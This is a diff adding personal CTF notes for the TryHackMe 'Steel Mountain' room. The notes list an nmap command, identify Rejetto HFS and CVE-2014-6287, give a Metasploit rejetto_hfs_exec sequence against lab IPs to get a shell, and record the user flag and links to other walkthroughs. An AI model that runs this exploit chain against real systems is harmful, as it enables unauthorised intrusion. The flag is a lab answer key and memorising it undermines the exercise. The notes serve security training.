@@ -1,0 +1,46 @@
+#Task 1  Introduction
+In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
+
+If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room.
+Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
+
+-Who is the employee of the month?
+hint: http://10.10.79.133/ --->view source
+Bill Harper
+
+#Task 2  Initial Access
+- Scan the machine with nmap. What is the other port running a web server on?
+hint: nmap -sSVC -Pn -vv $IP
+8080
+
+
+- Take a look at the other web server. What file server is running?
+hint: googling http file server 2.3
+Rejetto Http File Server
+
+
+- What is the CVE number to exploit this file server?
+hint: search Rejetto on exploit-db.com
+2014-6287
+
+- Use Metasploit to get an initial shell. What is the user flag?
+hint:
+msf6>search rejetto
+msf6>use exploit/windows/http/rejetto_hfs_exec
+set lhost 10.6.88.227
+set rhosts 10.10.79.133
+set rport 8080
+exploit
+meterpreter>shell
+cd c:\User\bill\Desktop
+more user.txt
+
+b04763b6fcf51fcd7c13abc7db4fd365
+
+
+
+https://tryhackme.com/room/steelmountain
+https://blog.razrsec.uk/steel-mountain-walkthrough/
+https://www.aldeid.com/wiki/TryHackMe-Steel-Mountain
+https://www.thedutchhacker.com/steel-mountain-on-tryhackme/
+https://0n3z3r0n3.medium.com/tryhackme-steel-mountain-617bc052cabd
